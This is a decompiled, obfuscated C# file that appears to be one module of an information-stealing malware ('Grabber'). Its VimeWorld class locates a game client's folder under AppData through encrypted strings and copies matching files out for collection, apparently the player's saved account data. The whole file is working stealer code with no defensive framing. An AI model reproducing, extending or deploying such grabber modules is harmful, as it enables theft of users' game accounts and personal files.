using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;

namespace Application.Grabber.Applications
{
	// Token: 0x02000040 RID: 64
	internal class VimeWorld
	{
		// Token: 0x17000050 RID: 80
		// (get) Token: 0x0600020B RID: 523 RVA: 0x0000DAE4 File Offset: 0x0000BCE4
		// (set) Token: 0x0600020C RID: 524 RVA: 0x0000DAF8 File Offset: 0x0000BCF8
		public static int Count { [MethodImpl(MethodImplOptions.NoInlining)] get; [MethodImpl(MethodImplOptions.NoInlining)] private set; }

		// Token: 0x0600020D RID: 525 RVA: 0x0000DB0C File Offset: 0x0000BD0C
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static List<FileObject> Execute()
		{
			List<FileObject> list = new List<FileObject>();
			list.AddRange(Helper.CopyAll(delegate0d0.f0000ba(Paths.AppDataPath, c0000c0.m00000f("Í/;\rË\fDXÞ\u001e*")), c0000c0.m00000f("Ðq=\bÏ\nRCÅ\u001d _TÁ$\nóÕ\u0001\u0014A\u00a0"), c0000c0.m00000f("òn#\u0002Ï\u000e"), SearchOption.TopDirectoryOnly));
			if (list.Count > 0)
			{
				VimeWorld.Count++;
			}
			return list;
		}

		// Token: 0x0600020E RID: 526 RVA: 0x0000DB6C File Offset: 0x0000BD6C
		[MethodImpl(MethodImplOptions.NoInlining)]
		public VimeWorld()
		{
		}

		// Token: 0x0600020F RID: 527 RVA: 0x0000DB74 File Offset: 0x0000BD74
		// Note: this type is marked as 'beforefieldinit'.
		[MethodImpl(MethodImplOptions.NoInlining)]
		static VimeWorld()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
		}

		// Token: 0x0400009F RID: 159
		[CompilerGenerated]
		private static int f00001a;
	}
}
